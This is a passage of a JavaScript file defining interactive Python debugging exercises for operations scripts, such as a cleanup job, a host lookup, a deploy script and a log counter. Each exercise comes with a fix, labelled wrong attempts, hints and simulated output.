// Playground scenarios: a real automation script with a bug, and a model of
// the world it runs in. sim(py) reads the learner's edited script (see
// playground.js for the reader) and returns what that script would print,
// its exit status, and whether each check holds. Outputs and tracebacks were
// captured from Python 3.13, requests 2.34 and PyYAML 6.0 where they apply.
"use strict";

(function (root) {
  root.PY_SCENARIOS = function (H) {
    const { HOME, LIB, VENV, traceback } = H;
    const src = (s) => String.raw(s).replace(/^\n/, "");
    const gone = (what) => ({ out: [[`(The script no longer does the job: ${what}. Reset brings the original back.)`, "dim"]], exit: 0, ok: [] });
    const lib = (f, l, fn, s) => [`${LIB}/${f}`, l, fn, s];
    const vlib = (f, l, fn, s) => [`${VENV}/${f}`, l, fn, s];
    const lines = (...t) => t.map((x) => (Array.isArray(x) ? x : [x, ""]));
    const err = (t) => [t, "err"];
    const dim = (t) => [t, "dim"];
    // A statement on the line, joined across brackets.
    const at = (py, re) => { const n = py.line(re); return n ? py.stmt(n) : ""; };
    // Does a block (or a line's statement) report something a person will see?
    const reports = (text) => /\b(print|logging\.\w+|log\.\w+|logger\.\w+|warn\w*)\s*\(|\braise\b|sys\.exit\s*\(\s*["'f]/.test(text);
    const S = [];

    // --- Basics -------------------------------------------------------------------

    const OLD = [["upload-7731.part", 30], ["export-oct.csv", 21], ["session-a91f.json", 2], ["thumb-0042.png", 0]];
    S.push({
      id: "indent", group: "Basics", level: "01", title: "IndentationError",
      file: "cleanup_tmp.py", cmd: "python3 cleanup_tmp.py",
      story: "A colleague added a log line to the nightly clean-up job from their phone. Since then the job fails before it deletes anything, and the upload disk is filling up.",
      goal: "Delete the scratch files older than 14 days, and keep the recent ones.",
      checks: ["Files older than 14 days are removed", "Recent files are kept"],
      code: src`
#!/usr/bin/env python3
"""Delete files older than 14 days from the upload scratch directory."""
import time
from pathlib import Path

SCRATCH = Path("/srv/uploads/tmp")
cutoff = time.time() - 14 * 86400

removed = 0
for path in SCRATCH.iterdir():
    if path.stat().st_mtime < cutoff:
    print(f"removing {path.name}")
        path.unlink()
        removed += 1
print(f"removed {removed} file(s)")
`,
      fix: [["    print(f\"removing {path.name}\")", "        print(f\"removing {path.name}\")"]],
      wrong: [
        [["    print(f\"removing {path.name}\")\n        path.unlink()\n        removed += 1", "        print(f\"removing {path.name}\")\n    path.unlink()\n    removed += 1"]],
        [["    print(f\"removing {path.name}\")", "\t\tprint(f\"removing {path.name}\")"]]
      ],
      hints: [
        "Read the last line of the output first: Python names the problem and the line it was on.",
        "Everything that belongs to the `if` must be indented one level more than the `if` itself.",
        "Indent the `print(...)` line to match `path.unlink()` below it: eight spaces, no tabs."
      ],
      lesson: "Indentation is the block structure in Python. A line at the wrong depth changes what the code means, or stops it parsing at all.",
      real: ["mkdir -p /tmp/scratch && touch -d '30 days ago' /tmp/scratch/old.part && touch /tmp/scratch/new.png",
        "sed -i 's#/srv/uploads/tmp#/tmp/scratch#' cleanup_tmp.py && python3 cleanup_tmp.py"],
      sim(py) {
        const un = py.line(/\.unlink\(\s*\)/);
        if (!un) return gone("it never deletes a file");
        const cond = py.inside(un, /^if\b/);
        const loop = py.inside(un, /^for\b/);
        const keepOld = !cond || !/st_mtime\s*>|>\s*st_mtime|cutoff\s*</.test(cond.code);
        let hit = OLD.filter(([, age]) => (!cond ? true : keepOld ? age > 14 : age <= 14));
        if (!loop) hit = hit.filter(([name]) => name === OLD[OLD.length - 1][0]);
        const says = py.line(/print\(\s*f?["']removing/);
        const out = lines(...(says ? hit.map(([n]) => `removing ${n}`) : []), ...(py.line(/print\(\s*f?["']removed/) ? [`removed ${hit.length} file(s)`] : []));
        return { out, exit: 0, ok: [OLD.every(([n, a]) => a <= 14 || hit.some(([x]) => x === n)), hit.every(([, a]) => a > 14)] };
      }
    });

    S.push({
      id: "none", group: "Basics", level: "01", title: "'NoneType' object is not subscriptable",
      file: "lookup.py", cmd: "python3 lookup.py web-01 web-02 db-old",
      story: "The on-call runbook says to look up a host's address with lookup.py. Tonight it crashes for db-old, a server that was retired last week, and prints nothing useful.",
      goal: "Print the addresses it can find, and say clearly which host is not in the inventory, without a traceback.",
      checks: ["No traceback", "The missing host is reported, not skipped silently"],
      code: src`
import json
import sys


def find_host(inventory, name):
    for host in inventory["hosts"]:
        if host["name"] == name:
            return host


def main():
    with open("inventory.json", encoding="utf-8") as f:
        inventory = json.load(f)
    for name in sys.argv[1:]:
        host = find_host(inventory, name)
        print(f"{name}: {host['ip']}")


if __name__ == "__main__":
    main()
`,
      fix: [["        host = find_host(inventory, name)\n", "        host = find_host(inventory, name)\n        if host is None:\n            print(f\"{name}: not in the inventory\", file=sys.stderr)\n            continue\n"]],
      wrong: [
        [["        print(f\"{name}: {host['ip']}\")", "        try:\n            print(f\"{name}: {host['ip']}\")\n        except:\n            pass"]],
        [["        host = find_host(inventory, name)\n", "        host = find_host(inventory, name) or {}\n"]]
      ],
      hints: [
        "The error is on `host['ip']`, but the cause is earlier: what does `find_host` return when no host matches?",
        "A function that reaches its end without `return` returns `None`. Check for that before you use the result.",
        "After `host = find_host(...)`, add `if host is None:` with a `print(..., file=sys.stderr)` and `continue`."
      ],
      lesson: "Functions that may find nothing return None. Check for it where you call them, and say what was missing.",
      real: ["echo '{\"hosts\": [{\"name\": \"web-01\", \"ip\": \"10.0.1.11\"}, {\"name\": \"web-02\", \"ip\": \"10.0.1.12\"}]}' > inventory.json",
        "python3 lookup.py web-01 web-02 db-old"],
      sim(py) {
        const use = py.line(/host\s*\[\s*["']ip["']\s*\]|host\.get\(\s*["']ip["']/);
        if (!use) return gone("it no longer prints an address");
        const good = lines("web-01: 10.0.1.11", "web-02: 10.0.1.12");
        const guardIf = py.lines(/^\s*if\s+(not\s+host|host\s+is\s+None|host\s*==\s*None)\s*:/).find((l) => l < use && /\b(continue|return|raise|sys\.exit)\b/.test(py.bodyText(l)));
        const parentIf = py.inside(use, /^if\s+(host\b(?!\s*is\s+None)|host\s+is\s+not\s+None)/);
        if (guardIf || parentIf) {
          const said = guardIf ? reports(py.bodyText(guardIf)) : /else\s*:[\s\S]*?(print|logging|sys\.exit)/.test(py.text);
          return { out: [...good, ...(said ? [err("db-old: not in the inventory")] : [])], exit: 0, ok: [true, said] };
        }
        const viaGet = /host\.get\(/.test(py.code[use - 1]);
        const orEmpty = py.has(/find_host\([^)]*\)\s*or\s*(\{\}|dict\(\))/);
        const problem = orEmpty ? (viaGet ? null : "KeyError: 'ip'") : "TypeError: 'NoneType' object is not subscriptable";
        if (!problem) return { out: [...good, ["db-old: None", ""]], exit: 0, ok: [true, false] };
        const h = py.catches(use, [problem.split(":")[0]]);
        if (h) return { out: [...good, ...(reports(h.body) ? [err("db-old: not in the inventory")] : [])], exit: 0, ok: [true, reports(h.body) && !/^\s*pass\s*$/.test(h.body)] };
        return { out: [...good, ...traceback(py, "lookup.py", use, null, problem)], exit: 1, ok: [false, false] };
      }
    });

    S.push({
      id: "keyerror", group: "Basics", level: "01", title: "KeyError on optional data",
      file: "list_accounts.py", cmd: "python3 list_accounts.py",
      story: "The quarterly access review needs every account in the identity export. The script stops at account 37 with a KeyError. That account is ci-deploy, a service account with no email address.",
      goal: "List all 120 accounts, showing a dash when an account has no email.",
      checks: ["No traceback", "All 120 accounts are listed"],
      code: src`
import json


def main():
    with open("users.json", encoding="utf-8") as f:
        users = json.load(f)
    for user in users:
        print(f"{user['login']:<20} {user['email']}")
    print(f"{len(users)} accounts")


if __name__ == "__main__":
    main()
`,
      fix: [["{user['email']}", "{user.get('email', '-')}"]],
      wrong: [
        [["{user['email']}", "{user.get['email']}"]],
        [["    for user in users:\n        print(f\"{user['login']:<20} {user['email']}\")\n", "    try:\n        for user in users:\n            print(f\"{user['login']:<20} {user['email']}\")\n    except KeyError:\n        pass\n"]],
        [["        print(f\"{user['login']:<20} {user['email']}\")\n", "        try:\n            print(f\"{user['login']:<20} {user['email']}\")\n        except KeyError:\n            continue\n"]]
      ],
      hints: [
        "`user['email']` demands the key. For service accounts the export simply leaves it out.",
        "`dict.get(key, default)` returns the default when the key is missing. Note the round brackets: it is a method call.",
        "Replace `{user['email']}` with `{user.get('email', '-')}`."
      ],
      lesson: "Index with [] for keys that must exist, and use .get() with a default for optional ones. Catching the KeyError around the loop only hides the rest of the list.",
      real: ["python3 -c \"import json; json.dump([{'login': 'alice', 'email': 'alice@shop.example'}, {'login': 'ci-deploy'}], open('users.json', 'w'))\"",
        "python3 list_accounts.py"],
      sim(py) {
        const n = py.line(/user\s*(\[|\.get)/);
        const p = n ? py.stmt(n) : "";
        if (!/email/.test(p)) return gone("it no longer prints the email column");
        const head = lines("alice                alice@shop.example", "bob                  bob@shop.example", dim("(34 more accounts)"));
        const all = lines("ci-deploy            -", dim("(83 more accounts)"), "120 accounts");
        if (/user\.get\s*\[/.test(p)) return { out: [...head, ...traceback(py, "list_accounts.py", n, null, "TypeError: 'builtin_function_or_method' object is not subscriptable")], exit: 1, ok: [false, false] };
        if (/user\.get\(\s*["']email["']/.test(p) || /["']email["']\s+in\s+user/.test(p)) return { out: [...head, ...all], exit: 0, ok: [true, true] };
        const h = py.catches(n, ["KeyError"]);
        if (!h) return { out: [...head, ...traceback(py, "list_accounts.py", n, null, "KeyError: 'email'")], exit: 1, ok: [false, false] };
        const loop = py.line(/^\s*for\s+user\s+in/);
        const inLoop = loop && py.inside(h.line, /^for\s+user\b/);
        if (inLoop) return { out: [...head, dim("(83 more accounts)"), ["120 accounts", ""]], exit: 0, ok: [true, false] };
        return { out: [...head, ...(py.line(/len\(users\)/) > h.line ? lines("120 accounts") : [])], exit: 0, ok: [true, false] };
      }
    });

    S.push({
      id: "mutable", group: "Basics", level: "02", title: "Tags leak between hosts",
      file: "tag_hosts.py", cmd: "python3 tag_hosts.py",
      story: "The firewall audit flags db-01 as internet-facing. It is not: the tags come from a helper that remembers every tag it has ever added.",
      goal: "Give each host only its own tags.",
      checks: ["db-01 is not tagged internet-facing", "build-01 gets only env:ci"],
      code: src`
def add_tags(host, tags=[]):
    tags.append(f"env:{host['env']}")
    if host.get("public"):
        tags.append("internet-facing")
    return tags


inventory = [
    {"name": "web-01", "env": "prod", "public": True},
    {"name": "db-01", "env": "prod"},
    {"name": "build-01", "env": "ci"},
]
for host in inventory:
    print(host["name"], add_tags(host))
`,
      fix: [["def add_tags(host, tags=[]):\n", "def add_tags(host, tags=None):\n    if tags is None:\n        tags = []\n"]],
      wrong: [
        [["tags=[]", "tags=list()"]],
        [["tags=[]", "tags=None"]]
      ],
      hints: [
        "Run it and read the lists: each host's tags include the previous hosts' tags.",
        "A default value is evaluated once, when `def` runs. Every call without `tags` shares that same list.",
        "Use `tags=None` as the default and create the list inside: `if tags is None: tags = []`."
      ],
      lesson: "Default arguments are created once. Use None as the default for anything mutable and make a fresh list, dict or set inside the function.",
      real: ["python3 tag_hosts.py"],
      sim(py) {
        const def = py.line(/^\s*def\s+add_tags\s*\(/);
        if (!def || !py.line(/add_tags\(\s*host\s*\)/)) return gone("add_tags is no longer called for each host");
        const sig = py.stmt(def);
        const body = py.bodyText(def);
        const fresh = /^\s*tags\s*=\s*(\[\]|list\(\)|\[\s*\*|list\(tags)/m.test(body) || /tags\s*=\s*(tags\s+or\s+\[\]|\[\]\s+if\s+tags\s+is\s+None|list\(tags\s+or)/.test(body)
          || /if\s+(tags\s+is\s+None|not\s+tags)\s*:\s*\n?\s*tags\s*=\s*(\[\]|list\(\))/.test(body);
        const shared = /tags\s*=\s*(\[\]|list\(\))/.test(sig);
        const none = /tags\s*=\s*None/.test(sig);
        if (!/tags\s*=/.test(sig)) return { out: traceback(py, "tag_hosts.py", py.line(/add_tags\(\s*host\s*\)/), null, "TypeError: add_tags() missing 1 required positional argument: 'tags'"), exit: 1, ok: [false, false] };
        if (none && !fresh) {
          const n = def + py.body(def).findIndex((l) => /tags\.append/.test(py.code[l - 1])) + 1;
          return { out: traceback(py, "tag_hosts.py", py.line(/tags\.append/) || n, null, "AttributeError: 'NoneType' object has no attribute 'append'"), exit: 1, ok: [false, false] };
        }
        if (shared && !fresh) return { out: lines("web-01 ['env:prod', 'internet-facing']", "db-01 ['env:prod', 'internet-facing', 'env:prod']", "build-01 ['env:prod', 'internet-facing', 'env:prod', 'env:ci']"), exit: 0, ok: [false, false] };
        return { out: lines("web-01 ['env:prod', 'internet-facing']", "db-01 ['env:prod']", "build-01 ['env:ci']"), exit: 0, ok: [true, true] };
      }
    });

    S.push({
      id: "argparse", group: "Basics", level: "05", title: "Deploys to None",
      file: "deploy.py", cmd: "python3 deploy.py --version 2.4.1",
      story: "Someone ran the deploy script without --env. It printed \"Deploying 2.4.1 to None\" and then crashed inside subprocess. Next time it might not crash.",
      goal: "Refuse to run without --env, with a usage message, and never pick an environment on the user's behalf.",
      checks: ["Refuses to deploy without --env", "Prints the usage and exits with status 2"],
      code: src`
import argparse
import subprocess


def main():
    parser = argparse.ArgumentParser(description="Deploy the shop to one environment.")
    parser.add_argument("--env", choices=["staging", "production"])
    parser.add_argument("--version", required=True)
    args = parser.parse_args()
    print(f"Deploying {args.version} to {args.env}")
    subprocess.run(["./deploy.sh", args.env, args.version], check=True)


if __name__ == "__main__":
    main()
`,
      fix: [["choices=[\"staging\", \"production\"])", "choices=[\"staging\", \"production\"], required=True)"]],
      wrong: [
        [["choices=[\"staging\", \"production\"])", "choices=[\"staging\", \"production\"], default=\"production\")"]],
        [["    print(f\"Deploying", "    if args.env is None:\n        print(\"no --env given\")\n    print(f\"Deploying"]]
      ],
      hints: [
        "An option that is not given is `None` in `args`. Nothing stops the script from carrying on with it.",
        "argparse can enforce it for you, with the standard usage message and exit status 2.",
        "Add `required=True` to the `--env` argument. A default of production is the one thing it must not have."
      ],
      lesson: "Let argparse validate input: required=True or a positional argument gives a clear usage error. A risky default is worse than an error.",
      real: ["printf '#!/bin/sh\\necho deploying \"$@\"\\n' > deploy.sh && chmod +x deploy.sh", "python3 deploy.py --version 2.4.1; echo \"exit $?\""],
      sim(py) {
        const env = py.call("parser\\.add_argument");
        const envArg = py.calls("parser\\.add_argument").find((c) => /["'](--env|env)["']/.test(c.pos[0] || ""));
        if (!env || !envArg) return gone("there is no --env argument");
        const usage = lines(err("usage: deploy.py [-h] --env {staging,production} --version VERSION"), err("deploy.py: error: the following arguments are required: --env"));
        if (/^["']env["']$/.test(envArg.pos[0])) return { out: lines(err("usage: deploy.py [-h] --version VERSION {staging,production}"), err("deploy.py: error: the following arguments are required: env")), exit: 2, ok: [true, true] };
        if (/^True$/.test(envArg.kw.required || "")) return { out: usage, exit: 2, ok: [true, true] };
        const dflt = envArg.kw.default && /["'](\w+)["']/.exec(envArg.kw.default);
        const value = dflt ? dflt[1] : "None";
        const guard = py.lines(/^\s*if\s+(not\s+args\.env|args\.env\s+is\s+None)\s*:/).find((l) => /parser\.error|sys\.exit|raise|return/.test(py.bodyText(l)));
        if (value === "None" && guard) {
          const b = py.bodyText(guard);
          if (/parser\.error/.test(b)) return { out: lines(err("usage: deploy.py [-h] [--env {staging,production}] --version VERSION"), err("deploy.py: error: --env is required")), exit: 2, ok: [true, true] };
          if (/sys\.exit\(\s*["'f]|sys\.exit\(\s*[1-9]|raise/.test(b)) return { out: lines(err("--env is required")), exit: 1, ok: [true, false] };
          return { out: [], exit: 0, ok: [true, false] };
        }
        const out = lines(`Deploying 2.4.1 to ${value}`);
        if (value === "None") {
          const run = py.line(/subprocess\.run\(/);
          return { out: [...out, ...(run ? traceback(py, "deploy.py", run, [lib("subprocess.py", 555, "run", "with Popen(*popenargs, **kwargs) as process:"), lib("subprocess.py", 1040, "__init__", "self._execute_child(args, executable, preexec_fn, close_fds,"), lib("subprocess.py", 1821, "_posix_spawn", "self.pid = os.posix_spawn(executable, args, env, **kwargs)")], "TypeError: expected str, bytes or os.PathLike object, not NoneType") : [])], exit: run ? 1 : 0, ok: [false, false] };
        }
        return { out: [...out, ...lines(`deploying ${value} 2.4.1`)], exit: 0, ok: [false, false] };
      }
    });

    S.push({
      id: "envtype", group: "Basics", level: "05", title: "'>' not supported for str",
      file: "disk_alert.py", cmd: "python3 disk_alert.py && DISK_ALERT_PERCENT=80 python3 disk_alert.py",
      story: "The disk alert worked for months with its default of 90%. The database team set DISK_ALERT_PERCENT=80 for their servers, and now the check crashes there every five minutes instead of alerting.",
      goal: "Use the threshold from the environment when it is set, and 90 otherwise. /var is 86% full.",
      checks: ["Works without DISK_ALERT_PERCENT", "Alerts at 86% with DISK_ALERT_PERCENT=80"],
      code: src`
import os
import shutil

THRESHOLD = os.environ.get("DISK_ALERT_PERCENT", 90)

usage = shutil.disk_usage("/var")
percent = usage.used / usage.total * 100
if percent > THRESHOLD:
    print(f"ALERT: /var is {percent:.0f}% full")
else:
    print(f"/var is {percent:.0f}% full")
`,
      fix: [["THRESHOLD = os.environ.get(\"DISK_ALERT_PERCENT\", 90)", "THRESHOLD = float(os.environ.get(\"DISK_ALERT_PERCENT\", 90))"]],
      wrong: [
        [["os.environ.get(\"DISK_ALERT_PERCENT\", 90)", "os.environ.get(\"DISK_ALERT_PERCENT\", \"90\")"]],
        [["os.environ.get(\"DISK_ALERT_PERCENT\", 90)", "os.environ[\"DISK_ALERT_PERCENT\"]"]]
      ],
      hints: [
        "It works without the variable and fails with it. What type does the default have, and what type does the environment give you?",
        "Environment variables are always strings. `os.environ.get` returns the string \"80\", or your default exactly as you wrote it.",
        "Convert once, where you read it: `THRESHOLD = float(os.environ.get(\"DISK_ALERT_PERCENT\", 90))`."
      ],
      lesson: "Everything from the environment, argv and files is a string. Convert it at the edge, once, and the rest of the script can trust its types.",
      real: ["python3 disk_alert.py", "DISK_ALERT_PERCENT=80 python3 disk_alert.py"],
      sim(py) {
        const cmp = py.line(/percent\s*>\s*|>\s*percent/);
        const def = at(py, /^\s*THRESHOLD\s*=/);
        if (!cmp || !def) return gone("it no longer compares the usage with THRESHOLD");
        const cmpText = py.code[cmp - 1];
        const conv = /(float|int)\s*\(\s*os\.(environ|getenv)/.test(def) || /(float|int)\s*\(\s*THRESHOLD\s*\)/.test(cmpText);
        const strDefault = /(get|getenv)\([^,]+,\s*["']/.test(def);
        const required = /os\.environ\s*\[/.test(def);
        const fail = () => traceback(py, "disk_alert.py", cmp, null, "TypeError: '>' not supported between instances of 'float' and 'str'");
        let first, ok1;
        if (required && !py.catches(py.line(/^\s*THRESHOLD\s*=/), ["KeyError"])) {
          first = traceback(py, "disk_alert.py", py.line(/^\s*THRESHOLD\s*=/), [lib("os.py", 714, "__getitem__", "raise KeyError(key) from None")], "KeyError: 'DISK_ALERT_PERCENT'");
          ok1 = false;
        } else if (strDefault && !conv) { first = fail(); ok1 = false; } else { first = lines("/var is 86% full"); ok1 = true; }
        const second = conv ? lines("ALERT: /var is 86% full") : fail();
        return { out: [...first, dim("---- with DISK_ALERT_PERCENT=80"), ...second], exit: conv ? 0 : 1, ok: [ok1, conv] };
      }
    });

    // --- Files and paths ------------------------------------------------------------

    S.push({
      id: "pathjoin", group: "Files and paths", level: "03", title: "Path glued together",
      file: "archive_build.py", cmd: "python3 archive_build.py   # on ops-01, and on the Windows build agent",
      story: "The archive step works on nobody's machine. On ops-01 it tries to write /srv/archive2026-10-30.zip and is refused; on the Windows build agent, whose ARCHIVE_DIR is D:\\Build Archive, the zip lands in the root of D: with a strange name.",
      goal: "Put the archive inside ARCHIVE_DIR on both machines, keeping ARCHIVE_DIR configurable.",
      checks: ["ops-01: the zip lands in /srv/archive/", "Windows agent: the zip lands in D:\\Build Archive\\"],
      code: src`
import os
import shutil
from datetime import date

ARCHIVE_DIR = os.environ.get("ARCHIVE_DIR", "/srv/archive")


def archive(build_dir):
    dest = ARCHIVE_DIR + date.today().isoformat()
    shutil.make_archive(dest, "zip", build_dir)
    print(f"archived {build_dir} to {dest}.zip")


if __name__ == "__main__":
    archive("build")
`,
      fix: [["import shutil\n", "import shutil\nfrom pathlib import Path\n"], ["    dest = ARCHIVE_DIR + date.today().isoformat()", "    dest = Path(ARCHIVE_DIR) / date.today().isoformat()"]],
      wrong: [
        [["ARCHIVE_DIR + date", "ARCHIVE_DIR + \"\\\\\" + date"]],
        [["ARCHIVE_DIR + date", "\"/srv/archive/\" + date"]]
      ],
      hints: [
        "Print `dest` in your head: \"/srv/archive\" followed straight away by \"2026-10-30\". Where is the separator?",
        "Adding \"/\" or \"\\\\\" by hand works on one system only. Let a path library choose the separator.",
        "Import `Path` from pathlib and build `dest = Path(ARCHIVE_DIR) / date.today().isoformat()`."
      ],
      lesson: "Build paths with pathlib (or os.path.join), never with + and a hand-typed separator. It handles separators, spaces and trailing slashes on every system.",
      real: ["mkdir -p build /tmp/archive && echo hi > build/x.txt", "ARCHIVE_DIR=/tmp/archive python3 archive_build.py && ls /tmp/archive"],
      sim(py) {
        const n = py.line(/^\s*dest\s*=/);
        const mk = py.line(/shutil\.make_archive\(/);
        if (!n || !mk) return gone("it no longer builds the archive path and the zip");
        const d = py.stmt(n);
        const def = at(py, /^\s*ARCHIVE_DIR\s*=/);
        const day = "2026-10-30";
        const proper = /Path\(\s*ARCHIVE_DIR\s*\)\s*(\/|\.joinpath)|os\.path\.join\(\s*ARCHIVE_DIR|PurePath\(\s*ARCHIVE_DIR/.test(d) || (/Path\(/.test(def) && /ARCHIVE_DIR\s*(\/|\.joinpath)/.test(d));
        const slash = /ARCHIVE_DIR\s*\+\s*["']\/["']|f["']\{ARCHIVE_DIR\}\//.test(d);
        const back = /ARCHIVE_DIR\s*\+\s*["']\\\\["']|f["']\{ARCHIVE_DIR\}\\\\/.test(d);
        const literal = !/ARCHIVE_DIR/.test(d) && (/["'](\/[^"']*)["']/.exec(d) || [])[1];
        const ok = (p) => lines(`archived build to ${p}.zip`);
        const denied = (p) => traceback(py, "archive_build.py", mk, [lib("shutil.py", 1174, "make_archive", "filename = func(base_name, base_dir, **kwargs)"),
          lib("shutil.py", 1027, "_make_zipfile", "with zipfile.ZipFile(zip_filename, \"w\","), lib("zipfile/__init__.py", 1414, "__init__", "self.fp = io.open(file, filemode)")],
          `PermissionError: [Errno 13] Permission denied: '${p.replace(/\\/g, "\\\\")}.zip'`);
        let linux, l1 = false, win, w1 = false;
        if (proper || slash) { linux = ok(`/srv/archive/${day}`); l1 = true; }
        else if (back) linux = denied(`/srv/archive\\${day}`);
        else if (literal) { linux = literal.startsWith("/srv/archive/") ? ok(`${literal}${day}`) : denied(`${literal}${day}`); l1 = literal.startsWith("/srv/archive/"); }
        else linux = denied(`/srv/archive${day}`);
        if (proper) { win = ok(`D:\\Build Archive\\${day}`); w1 = true; }
        else if (slash) { win = ok(`D:\\Build Archive/${day}`); w1 = true; }
        else if (back) { win = ok(`D:\\Build Archive\\${day}`); w1 = true; }
        else if (literal) win = lines(dim("(traceback through shutil.make_archive, as on Linux)"), err(`FileNotFoundError: [Errno 2] No such file or directory: '${literal}${day}.zip'`));
        else win = ok(`D:\\Build Archive${day}`);
        return { out: [dim("---- ops-01 (Linux, ARCHIVE_DIR not set)"), ...linux, dim("---- build-agent-2 (Windows, ARCHIVE_DIR=D:\\Build Archive)"), ...win], exit: l1 ? 0 : 1, ok: [l1, w1] };
      }
    });

    S.push({
      id: "bigfile", group: "Files and paths", level: "03", title: "Killed: the 10 GB log",
      file: "count_5xx.py", cmd: "python3 count_5xx.py /var/log/nginx/access.log   # 10.4 GB, on a 4 GB server",
      story: "During the outage the incident lead asked how many 5xx errors there were. The script ran for a minute, the server slowed to a crawl, and the shell printed one word: Killed.",
      goal: "Count the 5xx responses in the 10 GB log on a server with 4 GB of memory.",
      checks: ["Finishes without running out of memory", "Prints the count for each 5xx status"],
      code: src`
import re
import sys
from collections import Counter

PATTERN = re.compile(r'" (5\d\d) ')


def main(path):
    errors = Counter()
    lines = open(path, encoding="utf-8").readlines()
    for line in lines:
        m = PATTERN.search(line)
        if m:
            errors[m.group(1)] += 1
    for status, count in errors.most_common():
        print(status, count)


if __name__ == "__main__":
    main(sys.argv[1])
`,
      fix: [["    lines = open(path, encoding=\"utf-8\").readlines()\n    for line in lines:\n        m = PATTERN.search(line)\n        if m:\n            errors[m.group(1)] += 1\n",
        "    with open(path, encoding=\"utf-8\", errors=\"replace\") as f:\n        for line in f:\n            m = PATTERN.search(line)\n            if m:\n                errors[m.group(1)] += 1\n"]],
      wrong: [
        [["    lines = open(path, encoding=\"utf-8\").readlines()", "    with open(path, encoding=\"utf-8\") as f:\n        lines = f.readlines()"]],
        [["open(path, encoding=\"utf-8\").readlines()", "open(path, encoding=\"utf-8\").read().splitlines()"]]
      ],
      hints: [
        "\"Killed\" with exit status 137 is the kernel's out-of-memory killer, not Python. What holds the whole file in memory?",
        "`.readlines()` and `.read()` load everything at once. A file object can also be read one line at a time.",
        "Open it in a `with` block and loop over the file itself: `with open(path, ...) as f:` then `for line in f:`."
      ],
      lesson: "Iterate over a file object to stream it line by line: memory stays flat whatever the size. readlines() and read() hold everything at once.",
      real: ["yes '1.2.3.4 - - [30/Oct/2026] \"GET / HTTP/1.1\" 502 0' | head -n 5000000 > big.log", "/usr/bin/time -v python3 count_5xx.py big.log 2>&1 | grep -E '^5|Maximum resident'"],
      sim(py) {
        const opened = py.line(/open\(/);
        if (!opened || !py.has(/PATTERN\.search|re\.search/)) return gone("it no longer reads the log and searches it");
        const whole = py.has(/\.(readlines|read)\s*\(\s*\)|list\(\s*(f|fh|open\()|\[\s*\w+\s+for\s+\w+\s+in\s+(f|fh|open\()[^\]]*\]/);
        const handle = (/as\s+(\w+)\s*:/.exec(py.code[opened - 1]) || /^\s*(\w+)\s*=\s*open\(/.exec(py.code[opened - 1]) || [])[1];
        const lazy = new RegExp(`for\\s+\\w+\\s+in\\s+(${handle || "f"}|open\\([^)]*\\))\\s*:`).test(py.text);
        if (whole || !lazy) return { out: [dim("(memory climbs to 4 GB over 70 seconds; the server swaps)"), ["Killed", ""]], exit: 137, ok: [false, false] };
        const said = py.has(/print\(/);
        return { out: said ? lines("502 18211", "500 4410", "504 1203") : [], exit: 0, ok: [true, said] };
      }
    });

    S.push({
      id: "unicode", group: "Files and paths", level: "03", title: "UnicodeDecodeError",
      file: "import_customers.py", cmd: "python3 import_customers.py",
      story: "Finance exports the customer list from an old Windows system every night. The import script fails on the first accented name, and today's new customers are missing from the shop.",
      goal: "Read the whole export with every name intact. The file is in Windows-1252 (cp1252).",
      checks: ["Reads the whole file", "Names keep their accents"],
      code: src`
import csv


def main():
    with open("customers_export.csv", newline="") as f:
        for row in csv.DictReader(f):
            print(f"{row['id']:>6}  {row['name']}")


if __name__ == "__main__":
    main()
`,
      fix: [["open(\"customers_export.csv\", newline=\"\")", "open(\"customers_export.csv\", newline=\"\", encoding=\"cp1252\")"]],
      wrong: [
        [["newline=\"\")", "newline=\"\", errors=\"ignore\")"]],
        [["newline=\"\")", "newline=\"\", encoding=\"utf-8\", errors=\"replace\")"]],
        [["open(\"customers_export.csv\", newline=\"\")", "open(\"customers_export.csv\", \"rb\")"]]
      ],
      hints: [
        "Byte 0xe9 is é in the Windows and Latin-1 encodings. In UTF-8 it cannot appear on its own.",
        "Without `encoding=`, `open` uses the server's locale, which is UTF-8. Ignoring or replacing bad bytes would corrupt the names.",
        "Tell Python what the file is: `open(\"customers_export.csv\", newline=\"\", encoding=\"cp1252\")`."
      ],
      lesson: "Always pass encoding= to open(), and use the encoding the file was written in. errors=\"ignore\" and \"replace\" hide the problem by damaging the data.",
      real: ["printf 'id,name\\n1001,Jos\\xe9 Garc\\xeda\\n' > customers_export.csv", "python3 import_customers.py"],
      sim(py) {
        const n = py.line(/open\(\s*["']customers_export\.csv/);
        const loop = py.line(/for\s+\w+\s+in\s+csv\.(Dict)?[Rr]eader/);
        if (!n || !loop) return gone("it no longer reads customers_export.csv with csv");
        const o = py.call("open");
        const mode = o.pos[1] || o.kw.mode || "";
        const enc = ((/["']([\w-]+)["']/.exec(o.kw.encoding || "") || [])[1] || "utf-8").toLowerCase().replace(/_/g, "-");
        const errs = (/["'](\w+)["']/.exec(o.kw.errors || "") || [])[1];
        if (/b/.test(mode)) return { out: traceback(py, "import_customers.py", loop, [lib("csv.py", 177, "__next__", "self.fieldnames"), lib("csv.py", 164, "fieldnames", "self._fieldnames = next(self.reader)")], "_csv.Error: iterator should return strings, not bytes (the file should be opened in text mode)"), exit: 1, ok: [false, false] };
        const legacy = ["cp1252", "windows-1252", "latin-1", "latin1", "iso-8859-1", "iso8859-1", "8859"].includes(enc);
        const rows = (a, b) => lines(`  1001  ${a}`, `  1002  ${b}`, dim("(4,382 more customers)"));
        if (legacy) return { out: rows("José García", "Zoë Müller"), exit: 0, ok: [true, true] };
        if (errs === "ignore") return { out: rows("Jos Garca", "Zo Mller"), exit: 0, ok: [true, false] };
        if (errs === "replace") return { out: rows("Jos\uFFFD Garc\uFFFDa", "Zo\uFFFD M\uFFFDller"), exit: 0, ok: [true, false] };
        return { out: traceback(py, "import_customers.py", loop, [["<frozen codecs>", 325, "decode", ""]], "UnicodeDecodeError: 'utf-8' codec can't decode byte 0xe9 in position 1832: invalid continuation byte"), exit: 1, ok: [false, false] };
      }
    });

    S.push({
      id: "cwd", group: "Files and paths", level: "03", title: "Works by hand, fails in cron",
      file: "diskwatch/diskwatch.py", cmd: "cd ~ && python3 diskwatch/diskwatch.py   # what cron does",
      story: "The disk watcher works every time you run it from its folder. From cron it fails within a second, every ten minutes, and nobody gets the disk alerts.",
      goal: "Find config.json next to the script, wherever it is run from.",
      checks: ["Finds config.json from any working directory", "Reports every mount"],
      code: src`
import json
import shutil

with open("config.json", encoding="utf-8") as f:
    config = json.load(f)

for mount in config["mounts"]:
    usage = shutil.disk_usage(mount)
    print(f"{mount}: {usage.used * 100 // usage.total}% used")
`,
